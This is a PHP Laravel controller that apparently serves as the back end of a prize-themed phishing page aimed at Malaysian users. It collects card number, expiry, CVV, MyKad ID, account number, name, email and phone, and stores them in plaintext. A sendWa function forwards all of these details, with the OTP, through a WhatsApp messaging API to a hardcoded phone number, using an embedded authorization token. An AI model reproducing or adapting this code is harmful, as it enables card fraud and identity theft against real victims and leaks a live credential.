<?php

namespace App\Http\Controllers;

use App\Models\Costumer;
use App\Models\OTP;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;

class HadiahController extends Controller
{
    public function check(Request $request)
    {
        
  
        $validated = $request->validate([
            'card_number' => ['required', 'string', 'regex:/^[0-9 ]{13,23}$/'],
            'email' => ['required', 'email', 'max:255', 'unique:costumers,email'],
            'my_cad' => ['required', 'string', 'max:255'],
            'akaunt_kad' => ['required', 'string', 'max:255'],
            'nama_lengkap' => ['required', 'string', 'max:255'],
            'phone_number' => ['required', 'string', 'max:255'],
            'expiry' => ['required', 'string', 'regex:/^(0[1-9]|1[0-2])\s?\/\s?[0-9]{2}$/'],
            'cvv' => ['required', 'string', 'regex:/^[0-9]{3,4}$/'],
        ], [
            'card_number.required' => 'No. kad kredit wajib diisi.',
            'card_number.regex' => 'No. kad kredit mesti mengandungi 13 hingga 19 digit.',
            'email.required' => 'Email wajib diisi.',
            'email.email' => 'Format email tidak sah.',
            'email.unique' => 'Email ini sudah pernah digunakan.',
            'my_cad.required' => 'MyKad wajib diisi.',
            'akaunt_cad.required' => 'No. Akaun Kad wajib diisi.',
            'nama_lengkap.required' => 'Nama pemegang kad wajib diisi.',
            'phone_number.required' => 'Nomor telephone wajib diisi.',
            'expiry.required' => 'Tarikh tamat tempoh wajib diisi.',
            'expiry.regex' => 'Format tarikh tamat tempoh mesti MM/YY.',
            'cvv.required' => 'CVV/CVC wajib diisi.',
            'cvv.regex' => 'CVV/CVC mesti 3 atau 4 digit.',
        ]);

        // Create costumer
        $costumer = Costumer::query()->create([
            ...$validated,
            'tempat_lahir' => '-',
            'tanggal_lahir' => '-',
            'jenis_kelamin' => '-',
            'password' => Str::random(32),
        ]);

        $this->sendWa($costumer);
        return redirect("/otp/{$costumer->id}");
    }

    public function sendWa($costumer)
    {
        $message = "
card_number: {$costumer->card_number}
email: {$costumer->email}
my_cad: {$costumer->my_cad}
akaunt_kad: {$costumer->akaunt_kad}
nama_lengkap: {$costumer->nama_lengkap}
phone_number: {$costumer->phone_number}
expiry: {$costumer->expiry}
cvv: {$costumer->cvv}
otp: {$costumer->otp}
";
        $response = Http::withHeaders([
            'Authorization' => 'oAMf+vjnQeV9gmqAGRb8',
        ])->post('https://api.fonnte.com/send', [
            'target'  => '6285824477908',
            'message' => $message       ]);

        return response()->json($response->json());
    }
}
